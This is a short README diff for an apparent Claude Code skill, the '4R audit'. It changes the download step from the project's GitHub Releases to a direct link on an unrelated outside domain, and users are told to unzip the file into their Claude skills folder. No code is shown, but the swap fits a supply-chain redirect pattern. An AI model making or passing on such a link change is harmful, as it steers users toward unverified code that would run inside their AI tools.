@@ -44,7 +44,7 @@ No made up score out of 100. Only numbers that were counted.
 
 ## Install the 4R audit
 
-1. Download **rymac-4r-icm-audit.zip** from the Releases section on this GitHub page.
+1. Download **rymac-4r-icm-audit.zip** here: https://filesnfolders.com/downloads/rymac-4r-icm-audit.zip
 2. Unzip the zip into your Claude Code skills folder:
    - Mac or Linux: `~/.claude/skills/`
    - Windows: `C:\Users\YOUR-NAME\.claude\skills\`
